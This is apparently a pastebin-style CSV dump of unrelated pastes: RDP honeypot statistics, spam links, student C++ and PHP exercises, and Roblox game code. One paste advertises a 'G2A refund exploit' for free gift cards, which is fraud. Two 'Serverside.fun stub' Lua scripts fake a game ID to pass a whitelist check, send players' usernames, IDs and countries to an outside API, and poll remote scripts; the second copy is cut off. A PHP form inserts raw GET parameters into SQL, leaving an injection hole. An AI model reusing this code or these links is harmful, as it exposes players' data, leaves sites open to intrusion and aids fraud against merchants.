id,title,username,language,date,content
g68GwyKG,2024-01-07_stats.json,rdp_snitch,JSON,Sunday 7th of January 2024 06:16:05 PM CDT,"{
  ""ip"": {
    ""74.105.22.131"": 56,
    ""194.165.17.21"": 42,
    ""45.93.20.204"": 12,
    ""87.251.75.145"": 6,
    ""205.210.31.239"": 6,
    ""13.89.56.19"": 2,
    ""43.128.12.208"": 6,
    ""80.66.76.92"": 4,
    ""87.251.75.64"": 2,
    ""45.227.254.55"": 12,
    ""170.64.218.99"": 2,
    ""216.73.161.66"": 4,
    ""185.170.144.3"": 4,
    ""198.235.24.226"": 6,
    ""45.86.81.112"": 4,
    ""103.221.220.181"": 6,
    ""196.190.117.7"": 4,
    ""87.251.75.120"": 4,
    ""162.142.125.12"": 2,
    ""43.154.91.97"": 2,
    ""185.196.220.41"": 6,
    ""193.142.146.227"": 6,
    ""103.184.47.83"": 2,
    ""103.77.246.109"": 4,
    ""193.37.69.213"": 6,
    ""118.193.33.16"": 2,
    ""147.78.47.51"": 4,
    ""205.210.31.249"": 6,
    ""58.218.204.183"": 6,
    ""167.94.138.36"": 2,
    ""123.60.31.31"": 4,
    ""89.248.170.88"": 2,
    ""106.75.210.215"": 2,
    ""213.109.202.232"": 6,
    ""198.235.24.197"": 6
  },
  ""asn"": {
    ""AS701"": 56,
    ""AS48721"": 42,
    ""AS57523"": 12,
    ""AS208091"": 22,
    ""AS396982"": 24,
    ""AS8075"": 2,
    ""AS132203"": 8,
    ""AS267784"": 12,
    ""AS14061"": 2,
    ""AS206092"": 4,
    ""AS197414"": 4,
    ""AS205516"": 4,
    ""AS63760"": 6,
    ""AS24757"": 4,
    ""AS398324"": 4,
    ""AS208046"": 12,
    ""AS146817"": 2,
    ""AS140810"": 4,
    ""AS135377"": 2,
    ""AS209588"": 4,
    ""AS4134"": 6,
    ""AS55990"": 4,
    ""AS202425"": 2,
    ""AS17621"": 2,
    ""AS208312"": 6
  },
  ""isp"": {
    ""Verizon Business"": 56,
    ""Flyservers S.A."": 58,
    ""Chang Way Technologies Co. Limited"": 12,
    ""Xhost Internet Solutions LP"": 20,
    ""Google LLC"": 24,
    ""Microsoft Corporation"": 2,
    ""Aceville Pte.ltd"": 6,
    ""DigitalOcean, LLC"": 2,
    ""Ipxo Limited"": 4,
    ""NLS ASTANA LLP"": 4,
    ""AZDIGI Corporation"": 6,
    ""Ethiotelecom"": 4,
    ""Censys, Inc."": 4,
    ""Shenzhen Tencent Computer Systems Company Limited"": 2,
    ""ColocationX Ltd."": 12,
    ""Hubei Feixun Network Co., Ltd"": 2,
    ""BIDATA"": 4,
    ""Xhost Internet Solutions"": 6,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""Chinanet"": 6,
    ""Huawei Cloud Service data center"": 4,
    ""IP Volume inc"": 2,
    ""UCLOUD"": 2,
    ""Red Byte LLC"": 6
  },
  ""org"": {
    ""Verizon Business"": 56,
    ""Flyservers S.A"": 46,
    ""Starcrecium Limited"": 12,
    ""Xhost Internet Solutions"": 16,
    ""Palo Alto Networks, Inc"": 24,
    ""Microsoft Azure Cloud (centralus)"": 2,
    ""Unknown"": 14,
    ""UAB Host Baltic"": 12,
    ""DigitalOcean, LLC"": 2,
    ""Bandito Networks"": 4,
    ""Xhostis"": 4,
    ""AZDIGI"": 6,
    ""Censys Inc"": 2,
    ""Tencent Cloud Computing"": 2,
    ""Makut Investments"": 6,
    ""ColocationX Ltd"": 6,
    ""Hubei Feixun Network Co., Ltd"": 2,
    ""Bidata Media and Technology Joint Stock Company"": 4,
    ""XHOSTIS"": 6,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""Chinanet JS"": 6,
    ""Censys, Inc"": 2,
    ""Huawei Public Cloud Service"": 4,
    ""Quasi Networks LTD."": 2,
    ""Shanghai UCloud Information Technology Company Limited"": 2,
    ""Chang Way Technologies Co. Limited"": 6
  },
  ""regionName"": {
    ""New Jersey"": 56,
    ""Kaunas"": 42,
    ""Moscow"": 18,
    ""North Holland"": 38,
    ""California"": 24,
    ""Iowa"": 2,
    ""Central and Western District"": 10,
    ""Vilnius"": 12,
    ""New South Wales"": 2,
    ""New York"": 4,
    ""Astana"": 4,
    ""Ho Chi Minh"": 6,
    ""Addis Ababa"": 4,
    ""Michigan"": 4,
    ""Virginia"": 6,
    ""Hubei"": 2,
    ""Hanoi"": 4,
    ""Jiangsu"": 6,
    ""Shanghai"": 4,
    ""Beijing"": 2
  },
  ""country"": {
    ""United States"": 96,
    ""Lithuania"": 54,
    ""Russia"": 18,
    ""The Netherlands"": 38,
    ""Hong Kong"": 10,
    ""Australia"": 2,
    ""Kazakhstan"": 4,
    ""Vietnam"": 10,
    ""Ethiopia"": 4,
    ""China"": 14
  },
  ""account"": {
    ""142.93.8.59"": 98,
    ""Domain"": 36,
    ""Administr"": 24,
    ""gyxDTVICk"": 2,
    ""rrvAEK"": 2,
    ""gJZZjb"": 2,
    ""Almaz"": 2,
    ""hello"": 32,
    ""Test"": 22,
    ""(empty)"": 10,
    ""vccSTBtRa"": 2,
    ""dFrrrw"": 2,
    ""jFpfuO"": 2,
    ""Administrator"": 2,
    ""ZEPRAX"": 2,
    ""TYBIpwFAc"": 2,
    ""arRIMj"": 2,
    ""NdyWregma"": 2,
    ""MDtvPU"": 2,
    ""RWxWky"": 2
  },
  ""keyboard"": {
    ""Unknown"": 250
  },
  ""client_build"": {
    ""Unknown"": 250
  },
  ""client_name"": {
    ""Unknown"": 250
  },
  ""ip_type"": {
    ""Unknown"": 180,
    ""proxy"": 12,
    ""hosting"": 46,
    ""mobile & proxy"": 4,
    ""mobile"": 6,
    ""hosting & proxy"": 2
  }
}"
VSdUhzAz,2024-01-07_stats.json,rdp_snitch,JSON,Sunday 7th of January 2024 06:15:09 PM CDT,"{
  ""ip"": {
    ""74.105.22.131"": 28,
    ""194.165.17.21"": 21,
    ""45.93.20.204"": 6,
    ""87.251.75.145"": 3,
    ""205.210.31.239"": 3,
    ""13.89.56.19"": 1,
    ""43.128.12.208"": 3,
    ""80.66.76.92"": 2,
    ""87.251.75.64"": 1,
    ""45.227.254.55"": 6,
    ""170.64.218.99"": 1,
    ""216.73.161.66"": 2,
    ""185.170.144.3"": 2,
    ""198.235.24.226"": 3,
    ""45.86.81.112"": 2,
    ""103.221.220.181"": 3,
    ""196.190.117.7"": 2,
    ""87.251.75.120"": 2,
    ""162.142.125.12"": 1,
    ""43.154.91.97"": 1,
    ""185.196.220.41"": 3,
    ""193.142.146.227"": 3,
    ""103.184.47.83"": 1,
    ""103.77.246.109"": 2,
    ""193.37.69.213"": 3,
    ""118.193.33.16"": 1,
    ""147.78.47.51"": 2,
    ""205.210.31.249"": 3,
    ""58.218.204.183"": 3,
    ""167.94.138.36"": 1,
    ""123.60.31.31"": 2,
    ""89.248.170.88"": 1,
    ""106.75.210.215"": 1,
    ""213.109.202.232"": 3,
    ""198.235.24.197"": 3
  },
  ""asn"": {
    ""AS701"": 28,
    ""AS48721"": 21,
    ""AS57523"": 6,
    ""AS208091"": 11,
    ""AS396982"": 12,
    ""AS8075"": 1,
    ""AS132203"": 4,
    ""AS267784"": 6,
    ""AS14061"": 1,
    ""AS206092"": 2,
    ""AS197414"": 2,
    ""AS205516"": 2,
    ""AS63760"": 3,
    ""AS24757"": 2,
    ""AS398324"": 2,
    ""AS208046"": 6,
    ""AS146817"": 1,
    ""AS140810"": 2,
    ""AS135377"": 1,
    ""AS209588"": 2,
    ""AS4134"": 3,
    ""AS55990"": 2,
    ""AS202425"": 1,
    ""AS17621"": 1,
    ""AS208312"": 3
  },
  ""isp"": {
    ""Verizon Business"": 28,
    ""Flyservers S.A."": 29,
    ""Chang Way Technologies Co. Limited"": 6,
    ""Xhost Internet Solutions LP"": 10,
    ""Google LLC"": 12,
    ""Microsoft Corporation"": 1,
    ""Aceville Pte.ltd"": 3,
    ""DigitalOcean, LLC"": 1,
    ""Ipxo Limited"": 2,
    ""NLS ASTANA LLP"": 2,
    ""AZDIGI Corporation"": 3,
    ""Ethiotelecom"": 2,
    ""Censys, Inc."": 2,
    ""Shenzhen Tencent Computer Systems Company Limited"": 1,
    ""ColocationX Ltd."": 6,
    ""Hubei Feixun Network Co., Ltd"": 1,
    ""BIDATA"": 2,
    ""Xhost Internet Solutions"": 3,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1,
    ""Chinanet"": 3,
    ""Huawei Cloud Service data center"": 2,
    ""IP Volume inc"": 1,
    ""UCLOUD"": 1,
    ""Red Byte LLC"": 3
  },
  ""org"": {
    ""Verizon Business"": 28,
    ""Flyservers S.A"": 23,
    ""Starcrecium Limited"": 6,
    ""Xhost Internet Solutions"": 8,
    ""Palo Alto Networks, Inc"": 12,
    ""Microsoft Azure Cloud (centralus)"": 1,
    ""Unknown"": 7,
    ""UAB Host Baltic"": 6,
    ""DigitalOcean, LLC"": 1,
    ""Bandito Networks"": 2,
    ""Xhostis"": 2,
    ""AZDIGI"": 3,
    ""Censys Inc"": 1,
    ""Tencent Cloud Computing"": 1,
    ""Makut Investments"": 3,
    ""ColocationX Ltd"": 3,
    ""Hubei Feixun Network Co., Ltd"": 1,
    ""Bidata Media and Technology Joint Stock Company"": 2,
    ""XHOSTIS"": 3,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1,
    ""Chinanet JS"": 3,
    ""Censys, Inc"": 1,
    ""Huawei Public Cloud Service"": 2,
    ""Quasi Networks LTD."": 1,
    ""Shanghai UCloud Information Technology Company Limited"": 1,
    ""Chang Way Technologies Co. Limited"": 3
  },
  ""regionName"": {
    ""New Jersey"": 28,
    ""Kaunas"": 21,
    ""Moscow"": 9,
    ""North Holland"": 19,
    ""California"": 12,
    ""Iowa"": 1,
    ""Central and Western District"": 5,
    ""Vilnius"": 6,
    ""New South Wales"": 1,
    ""New York"": 2,
    ""Astana"": 2,
    ""Ho Chi Minh"": 3,
    ""Addis Ababa"": 2,
    ""Michigan"": 2,
    ""Virginia"": 3,
    ""Hubei"": 1,
    ""Hanoi"": 2,
    ""Jiangsu"": 3,
    ""Shanghai"": 2,
    ""Beijing"": 1
  },
  ""country"": {
    ""United States"": 48,
    ""Lithuania"": 27,
    ""Russia"": 9,
    ""The Netherlands"": 19,
    ""Hong Kong"": 5,
    ""Australia"": 1,
    ""Kazakhstan"": 2,
    ""Vietnam"": 5,
    ""Ethiopia"": 2,
    ""China"": 7
  },
  ""account"": {
    ""142.93.8.59"": 49,
    ""Domain"": 18,
    ""Administr"": 12,
    ""gyxDTVICk"": 1,
    ""rrvAEK"": 1,
    ""gJZZjb"": 1,
    ""Almaz"": 1,
    ""hello"": 16,
    ""Test"": 11,
    ""(empty)"": 5,
    ""vccSTBtRa"": 1,
    ""dFrrrw"": 1,
    ""jFpfuO"": 1,
    ""Administrator"": 1,
    ""ZEPRAX"": 1,
    ""TYBIpwFAc"": 1,
    ""arRIMj"": 1,
    ""NdyWregma"": 1,
    ""MDtvPU"": 1,
    ""RWxWky"": 1
  },
  ""keyboard"": {
    ""Unknown"": 125
  },
  ""client_build"": {
    ""Unknown"": 125
  },
  ""client_name"": {
    ""Unknown"": 125
  },
  ""ip_type"": {
    ""Unknown"": 90,
    ""proxy"": 6,
    ""hosting"": 23,
    ""mobile & proxy"": 2,
    ""mobile"": 3,
    ""hosting & proxy"": 1
  }
}"
7sULjfa3,üéÅ List of all FREE Crypto Airdrops! üéÅ,VQ-Moe,GetText,Sunday 7th of January 2024 06:02:51 PM CDT,"Looking for a list of all the current, free airdrops from all blockchains?
Check out NetDrop - https://netdrop.netlify.app/

NetDrop provides a list of all active airdrops, which is updated every minute so you can claim the newest airdrops as soon as they are available.
No more finding airdrops; the airdrops find you.

Visit NetDrop completely free now, no sign-up required.
https://netdrop.netlify.app/

524683"
u8ANiWXu,Serverside.fun Stub Module Script (with custom logging),darraghd493,Lua,Sunday 7th of January 2024 06:00:22 PM CDT,"--[[
How to use this:
 - Fill out the settings (I suggest you leave SCRIPT_LOGGING on)
 - Create a game with this inserted into it (must be published & running on Roblox, no studio)
 - Done! :)
]]

-- Settings
local WHITELIST_USERNAME = """" -- Roblox username (whitelisted)
local WHITELIST_USER_ID = -1 -- Roblox user id (whitelisted)
local WHITELIST_GAME_ID = game.GameId -- Roblox game id (fakes what game your in)
local SCRIPT_LOGGING = true -- Whether you want scripts executed to be logged to the serverside.fun (WARNING: POTENTIALLY DANGEROUS!)
local CUSTOM_LOGGING_URL = """" -- URL to log custom scripts to

-- Variables
local GET_PLAYERS_URL = ""https://api.serverside.fun/v1/get-players""

local LocalisationService = game:GetService(""LocalizationService"")
local HttpService = game:GetService(""HttpService"")
local Players = game:GetService(""Players"")

-- Stub
local response = HttpService:GetAsync(""https://api.serverside.fun/v1/check-whitelist/"" .. WHITELIST_USER_ID .. ""/"" .. tostring(WHITELIST_GAME_ID))
local user_data = HttpService:JSONDecode(response)

print(response) -- Used for testing (check output in server console)

if user_data.whitelisted ~= false then
	local function getPlayerData()
		local playerData = {}
		for i, v in ipairs(Players:GetPlayers()) do
			local country = ""Unknown""
			pcall(function()
				country = LocalisationService:GetCountryRegionForPlayerAsync(v)
			end)
			table.insert(playerData, {username = v.Name, userid = v.UserId, displayName = v.DisplayName, country = country})
		end
		return playerData
	end

	local function postPlayerData()
		task.wait(0.5)
		if Players:FindFirstChild(WHITELIST_USERNAME) then
			HttpService:PostAsync(GET_PLAYERS_URL, HttpService:JSONEncode({value = getPlayerData(), robloxId = WHITELIST_USER_ID}))
		end
	end

	local posted_removing_1 = true
	local posted_removing_2 = false

	local function postPlayerRemovingData()
		task.wait(1)
		if Players:FindFirstChild(WHITELIST_USERNAME) and posted_removing_1 == true then
			postPlayerData()
		else
			posted_removing_1 = false
			if posted_removing_2 == false then
				HttpService:PostAsync(GET_PLAYERS_URL, HttpService:JSONEncode({value = {}, robloxId = WHITELIST_USER_ID}))
				posted_removing_2 = true
			end
		end
	end

	pcall(function()
		postPlayerData()
		Players.PlayerAdded:Connect(postPlayerData)
		Players.PlayerRemoving:Connect(postPlayerRemovingData)
	end)

	-- Premium script polling
	if user_data.type ~= ""NORMAL"" then
		pcall(function()
			local premium_script_poll_data = HttpService:JSONDecode(HttpService:GetAsync(""https://api.serverside.fun/v1/private-scripts/"" .. WHITELIST_USER_ID))
			for i, v in ipairs(premium_script_poll_data.scripts) do
				pcall(function()
					if v == ""r6()"" then
						print(""premium r6 stub (3436957371)"")
					elseif v == ""re()"" then
						print(""premium reset stub (load character)"")
					elseif v:match(""USERNAME"") then
						print(""premium hub/custom stub ("" .. tostring(v) .. "")"")
						if CUSTOM_LOGGING_URL ~= """" then
							HttpService:PostAsync(CUSTOM_LOGGING_URL, tostring(v))
						end
					else
						print(""premium custom stub ("" .. tostring(v) .. "")"")
						HttpService:PostAsync(CUSTOM_LOGGING_URL, tostring(v))
					end
				end)
			end
		end)
	end

	-- Normal script polling
	local script_poll_url = ""https://api.serverside.fun/v1/long-polling/kkwAhfSFRnAyAoffQYNEEviBUAVs/"" .. WHITELIST_USER_ID
	while true do
		local success, error = pcall(HttpService.GetAsync, HttpService, script_poll_url)
		if success then
			local success_2, error_2 = pcall(HttpService.JSONDecode, HttpService, error)
			if success_2 then
				if error_2 and error_2[""script""] then
					if Players:FindFirstChild(WHITELIST_USERNAME) then
						local polled_script = error_2[""script""].script
						if WHITELIST_USER_ID == tonumber(error_2[""script""].robloxId) then
							if polled_script == ""r6()"" then
								print(""r6 stub (3436957371)"")
							elseif polled_script == ""re()"" then
								print(""reset stub (load character)"")
							elseif polled_script:match(""USERNAME"") then
								print(""hub/custom stub ("" .. tostring(polled_script) .. "")"")
								HttpService:PostAsync(CUSTOM_LOGGING_URL, tostring(polled_script))
							else
								print(""custom stub ("" .. tostring(polled_script) .. "")"")
								HttpService:PostAsync(CUSTOM_LOGGING_URL, tostring(polled_script))
							end
							
							if SCRIPT_LOGGING then
								pcall(function()
									HttpService:PostAsync(""https://api.serverside.fun/v1/script-logs"", HttpService:JSONEncode({
										[""script""] = polled_script,
										[""robloxId""] = tostring(WHITELIST_USER_ID),
										[""gameId""] = tostring(WHITELIST_GAME_ID)
									}))
								end)
							end
						end
					end
				end
			end
		end
		task.wait()
	end
end
"
vkJHYPau,Untitled,sissou123,PHP,Sunday 7th of January 2024 05:34:41 PM CDT,"PHP with MySQL- Procedural Part
Learn to Code in PHP Procedural way in an easy and understandable way by following from basics to using MySQL with PHP 
This course covers PHP and MySQL from Very Beginning that even anybody who has never Programmed can take the concepts from this course easily(I believe).If you want to Learn PHP Programming from Scratch then This course might be the good guide for you 
for more:https://cuty.io/VMacf
"
jMXs3uJy,ü§ë G2A.com Refund Exploit Jan 2024 ü§ë,G2ARefundExploit,GetText,Sunday 7th of January 2024 05:26:02 PM CDT,"G2A.com refund exploit updated guide 
Any item for free on G2A.com such as Amazon, Steam, and any other gift cards.
 
PDF guide here:
https://drive.google.com/file/d/120kXNJWM5T5u3PGlkQeZCo_nLxzQIlkf/view?usp=g2a_refund_exploit_645872.pdf
 
Working as of
07 January 2024"
fg33Sz7w,Einer.von.Uns.2015.Deu.720p.h264.eac3.Subs-bp,bpmircea,BrainFuck,Sunday 7th of January 2024 05:14:19 PM CDT,"Einer von uns (One of Us) (Stephan Richter, 2015)
aka
Einer.von.Uns.2015.Deu.720p.h264.eac3.Subs-bp
https://www.imdb.com/title/tt4939866/

Uploading...

Audio tracks: de-AT | Subtitles: de-AT en"
zv5XaaQm,k4.cpp,pan7nikt,C++,Sunday 7th of January 2024 05:12:58 PM CDT,"#include <iostream>
#include <fstream>

using namespace std;

struct warzywo
{
    char rodzaj [30];
    int jakosc;
    float masa;
};


//Zadanie 2
warzywo** tablicadyn(int x, int y)
{
    warzywo **tab = new warzywo*[x];
    for(int i=0; i<y; i++)
    {
        tab[i] = new warzywo[x];
    }
    return tab;
}

//Zadanie 3
void pobieranie(warzywo& w)
{
    char rodzaj[30] = """";
    int jakosc = 0;
    float masa = 0.0;

    cout << ""Podaj rodzaj: "";
    cin >> w.rodzaj;
    cout << ""\nPodaj jakosc: "";
    cin >> jakosc;
    cout << ""\nPodaj mase: "";
    cin >> masa;

    w.jakosc = jakosc;
    w.masa = masa;
}

//Zadanie 4
bool zapis(warzywo w[], int rozmiar, string nazwa)
{
    ofstream plik(nazwa);
    if(!plik){return false;}
    for(int i=0;i<rozmiar;i++)
    {
        plik << w[i].rodzaj << "" "" << w[i].jakosc << "" "" << w[i].masa << "" "" << endl;
    }
    return true;
}

//Zadanie 5 (sprawd≈∫ parzysto≈õƒá bit√≥w w int)
bool parzyste(int x)
{
    int parzysta = 0;
    while(x > 0)
    {
        //parzysta + AND z pierwszego bitu z jedynkƒÖ (robimy licznik jedynek)
        parzysta = parzysta + (x & 1);
        //Bit shift o jednƒÖ w prawo (np. 0110 -> 0011)
        x >>= 1;
    }
    //DEBUG
    //cout << ""Parzysta: "" << parzysta << ""\n"";

    //Reszta dzielenia z sumy jedynek przez 2
    parzysta = parzysta % 2;

    //DEBUG
    //cout << ""Parzysta po mod: "" << parzysta << ""\n"";

    //Zwracamy odwr√≥conƒÖ warto≈õƒá (bo reszta jest 1 jak liczba jest nieparzysta, a my chcemy na odwr√≥t)
    return parzysta;
}

int main()
{
//Zad 5
cout << parzyste(3);

//Zad 1

    warzywo w;
pobieranie(w);
cout << ""\nRodzaj to: "" << w.rodzaj;
cout << ""\nJakosc to: "" << w.jakosc;
cout << ""\nMasa to: "" << w.masa;

//Dane do zadania 4
string nazwa;
int rozmiar = 3;
warzywo warzywa[3];

for(int i=0;i<rozmiar;i++)
{
    cout << ""Podaj rodzaj: "";
    cin >> warzywa[i].rodzaj;
    cout << ""\nPodaj jakosc: "";
    cin >> warzywa[i].jakosc;
    cout << ""\nPodaj mase: "";
    cin >> warzywa[i].masa;
};

cout << ""\nPodaj nazwe pliku: "";
cin >> nazwa;
cout << ""\nPodaj rozmiar tablicy warzyw: "";
zapis(warzywa, rozmiar, nazwa);
system(""pause"");
}
"
AeP6fJ3m,Untitled,Alexplazz,Lua,Sunday 7th of January 2024 04:46:39 PM CDT,"local Team = {}
Team.__index = Team

function Team.new(TeamName, Template)
	local NewTeam = setmetatable({}, Team)
	NewTeam.AtWarWith = false
	NewTeam.Name = TeamName
	NewTeam.MaxSoldiers = math.huge
	NewTeam.TemplateCharacter = game.ServerStorage.NPC or Template
	NewTeam.Soldiers = {}
	NewTeam.SpawnPad = false
	return NewTeam
end

function Team:AddSoldier(Soldier)
	table.insert(self.Soldiers, Soldier)
end


return Team"
V31wRHaw,Untitled,Alexplazz,Lua,Sunday 7th of January 2024 04:46:17 PM CDT,"local Soldier, Names = {}, require(game.ReplicatedStorage.Names)
local SoldierID = 0
local SoldierActions = require(script.SoldierActions)
local Hats = game.ServerStorage.Hats:GetChildren()
Soldier.__index = Soldier

function Soldier.new(Team)
	SoldierID += 1
	-- Create object.
	local NewSoldier = setmetatable({}, Soldier)
	NewSoldier.Name = Names[math.random(1, #Names)]
	
	-- Attributes
	NewSoldier.OnDuty = true
	NewSoldier.SoldierID = SoldierID
	
	-- Give character.
	local newCharacter = Team.TemplateCharacter:Clone()
	newCharacter.Name = NewSoldier.Name
	newCharacter.Humanoid.DisplayName = NewSoldier.Name
	newCharacter.Humanoid.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.Viewer
	NewSoldier.Character = newCharacter
	NewSoldier.Character:SetAttribute(""Break"", false)
	
	-- Give random hat.
	local randHat = Hats[math.random(1, #Hats)]:Clone()
	randHat.Parent = newCharacter
	
	-- Character is ready.
	newCharacter.Parent = workspace

	-- SpawnPad
	if Team.SpawnPad then
		newCharacter:MoveTo(Team.SpawnPad.Position)
	end
	
	-- Add to team.
	if Team then
		Team:AddSoldier(NewSoldier)
	end
	
	coroutine.wrap(function()
		NewSoldier:HeartLoop(Team.AtWarWith)
	end)()
	
	return NewSoldier
end

function Soldier:Die()
	self.OnDuty = false
	wait(2)
	self.Character:Destroy()
end

function Soldier:DistanceTo(Part)
	local PrimaryPart = self.Character.PrimaryPart
	if PrimaryPart then
		local CurrentPosition = PrimaryPart.Position
		local EndPosition = Part.Position
		local Direction = EndPosition - CurrentPosition
		return Direction.Magnitude
	end
end

function Soldier:FindClosestEnemy(EnemyTeam)
	local ClosestStuds, ClosestEnemy = math.huge, false
	for _, EnemySoldier in pairs(EnemyTeam.Soldiers) do
		local Character = EnemySoldier.Character
		if Character and Character.PrimaryPart then
			local Distance = self:DistanceTo(Character.PrimaryPart)
			if Distance < ClosestStuds then
				if Character.Humanoid.Health > 1 then
					ClosestStuds = Distance
					ClosestEnemy = EnemySoldier
				end
			end
		end
	end
	return ClosestEnemy
end

local IdleRange = 5
function Soldier:Idle()
	local Character, Position = self.Character, self.Character.PrimaryPart.Position
	if math.random(1,5) == 1 then

		local X = Position.X + math.random(-IdleRange, IdleRange)
		local Z = Position.Z + math.random(-IdleRange, IdleRange)

		Position = Vector3.new(X, Position.Y, Z)

		Character.Humanoid:MoveTo(Position)
	end
end

function Soldier:FindPath(Target)
	local Path = game:GetService(""PathfindingService""):CreatePath({
		AgentCanJump = true
	})

	Path:ComputeAsync(self.Character.PrimaryPart.Position, Target.Character.PrimaryPart.Position)
	local Waypoints = Path:GetWaypoints()

	if Path.Status == Enum.PathStatus.Success then
		for _, v in ipairs(Waypoints) do
			if v.Action == Enum.PathWaypointAction.Jump then
				self.Character.Humanoid.Jump = true
			end
			self.Character.Humanoid:MoveTo(v.Position)
			local TimeOut = self.Character.Humanoid.MoveToFinished:Wait(1)
			-- TimeOut
			if not TimeOut then
				print(""Path too long!"")
				self:FindPath(Target)
				break
			end
			
			-- CheckSight
			if (not self.Character.PrimaryPart) or (not Target.Character.PrimaryPart) then
				return	
			end
			
			if (self.Character.PrimaryPart.Position - Target.Character.PrimaryPart.Position).magnitude < 10 then
				Target.Character.Humanoid:TakeDamage(10)
				if Target.Character.Humanoid.Health < 1 then
					Target:Die()
					return
				end
			end 
			
			-- Can the soldier currently make a kill?
			
			
			if (self.Character.PrimaryPart.Position - Waypoints[1].Position).magnitude > 20 then
				print(""Target has moved."")
				self:FindPath(Target)
				break
			end
		end
	end
end

function Soldier:Heartbeat(EnemyTeam)
	local Target = self:FindClosestEnemy(EnemyTeam)
	if Target then
		self:FindPath(Target)
		print(""Busy"")
	else
		print(""Bored"")
		self:Idle()
	end
end

function Soldier:HeartLoop(EnemyTeam)
	while wait(0.1) do
		if not self.OnDuty then break end
		if self.Character.Humanoid.Health < 1 then
			break
		end

		self:Heartbeat(EnemyTeam)
	end

end

return Soldier
"
V1xHnAPr,Leaderstats Script,Fr4st3yyt,Lua,Sunday 7th of January 2024 03:52:27 PM CDT,"game.Players.PlayerAdded:Connect(function(player)
	
	local leaderstats = Instance.new(""Folder"",player)
	leaderstats.Name = ""leaderstats""
	
	local Wins = Instance.new(""IntValue"",leaderstats)
	Wins.Name = ""Wins""
	Wins.Value = 0
	
	while wait(5) do
		Wins.Value += 1 -- For testing
	end
	 
end)"
DxzNQXxm,dodawanie,ppiso,PHP,Sunday 7th of January 2024 03:22:46 PM CDT,"    <?php
    //echo ""dodawanie"";
    if(ISSET($_GET['mode']))
        {
            if($_GET['mode']==""dodaj"")
            {
                $query=""INSERT INTO rozklad (rozklad_id,dzien,zajecie,priorytet) VALUES ('{$_GET ['rozklad_id']}', '{$_GET ['dzien']}', '{$_GET ['zajecie']}', '{$_GET ['priorytet']}')"";
                $connect->query($query);
            }  
        }
    ?>
    <form action=""index.php"" method=""get"">
        <table>
            <tr>
                <td>rozklad_id</td>
                <td><input type=""number"" name=""rozklad_id"" placeholder=""id""></td>
            </tr>
            <tr>
                <td>dzien</td>
                <td><input type=""text"" name=""dzien"" placeholder=""dzien""></td>
            </tr>
            <tr>
                <td>zajecie</td>
                <td><input type=""text"" name=""zajecie"" placeholder=""zajecie"" ></td>
            </tr>
            <tr>
                <td>priorytet</td>
                <td><input type=""number"" min=""1"" max=""255"" name=""priorytet"" placeholder=""priorytet""></td>
            </tr>
        </table>
    <input value=""dodaj""name=""mode"" type=""submit"" >
    </form>"
uXZDPN8K,Serverside.fun Stub Module Script,darraghd493,Lua,Sunday 7th of January 2024 03:04:17 PM CDT,"--[[
How to use this:
 - Fill out the settings (I suggest you leave SCRIPT_LOGGING on)
 - Create a game with this inserted into it (must be published & running on Roblox, no studio)
 - Done! :)
]]

-- Settings
local WHITELIST_USERNAME = """" -- Roblox username (whitelisted)
local WHITELIST_USER_ID = -1-- Roblox user id (whitelisted)
local WHITELIST_GAME_ID = game.GameId -- Roblox game id (fakes what game your in)
local SCRIPT_LOGGING = true -- Whether you want scripts executed to be logged to the serverside.fun (WARNING: POTENTIALLY DANGEROUS!)

-- Variables
local GET_PLAYERS_URL = ""https://api.serverside.fun/v1/get-players""

local LocalisationService = game:GetService(""LocalizationService"")
local HttpService = game:GetService(""HttpService"")
local Players = game:GetService(""Players"")

-- Stub
local response = HttpService:GetAsync(""https://api.serverside.fun/v1/check-whitelist/"" .. WHITELIST_USER_ID .. ""/"" .. tostring(WHITELIST_GAME_ID))
local user_data = HttpService:JSONDecode(response)

print(response) -- Used for testing (check output in server console)

if user_data.whitelisted ~= false then
	local function getPlayerData()
		local playerData = {}
		for i, v in ipairs(Players:GetPlayers()) do
			local country = ""Unknown""
			pcall(function()
				country = LocalisationService:GetCountryRegionForPlayerAsync(v)
			end)
			table.insert(playerData, {username = v.Name, userid = v.UserId, displayName = v.DisplayName, country = country})
		end
		return playerData
	end

	local function postPlayerData()
		task.wait(0.5)
		if Players:FindFirstChild(WHITELIST_USERNAME) then
			HttpService:PostAsync(GET_PLAYERS_URL, HttpService:JSONEncode({value = getPlayerData(), robloxId = WHITELIST_USER_ID}))
		end
	end

	local posted_removing_1 = true
	local posted_removing_2 = false

	local function postPlayerRemovingData()
		task.wait(1)
		if Players:FindFirstChild(WHITELIST_USERNAME) and posted_removing_1 == true then
			postPlayerData()
		else
			posted_removing_1 = false
			if posted_removing_2 == false then
				HttpService:PostAsync(GET_PLAYERS_URL, HttpService:JSONEncode({value = {}, robloxId = WHITELIST_USER_ID}))
				posted_removing_2 = true
			end
		end
	end

	pcall(function()
		postPlayerData()
		Players.PlayerAdded:Connect(postPlayerData)
		Players.PlayerRemoving:Connect(postPlayerRemovingData)
	end)

	-- Premium script polling
	if user_data.type ~= ""NORMAL"" then
		pcall(function()
			local premium_script_poll_data = HttpService:JSONDecode(HttpService:GetAsync(""https://api.serverside.fun/v1/private-scripts/"" .. WHITELIST_USER_ID))
			for i, v in ipairs(premium_script_poll_data.scripts) do
				pcall(function()
					if v == ""r6()"" then
						print(""premium r6 stub (3436957371)"")
					elseif v == ""re()"" then
						print(""premium reset stub (load character)"")
					elseif v:match(""USERNAME"") then
						print(""premium hub/custom stub ("" .. tostring(v) .. "")"")
					else
						print(""premium custom stub ("" .. tostring(v) .. "")"")
					end
				end)
			end
		end)
	end

	-- Normal script polling
	local script_poll_url = ""https://api.serverside.fun/v1/long-polling/kkwAhfSFRnAyAoffQYNEEviBUAVs/"" .. WHITELIST_USER_ID
	while true do
		local success, error = pcall(HttpService.GetAsync, HttpService, script_poll_url)
		if success then
			local success_2, error_2 = pcall(HttpService.JSONDecode, HttpService, error)
			if success_2 then
				if error_2 and error_2[""script""] then
					if Players:FindFirstChild(WHITELIST_USERNAME) then
						local polled_script = error_2[""script""].script
						if WHITELIST_USER_ID == tonumber(error_2[""script""].robloxId) then
							if polled_script == ""r6()"" then
								print(""r6 stub (3436957371)"")
							elseif polled_script == ""re()"" then
								print(""reset stub (load character)"")
							elseif polled_script:match(""USERNAME"") then
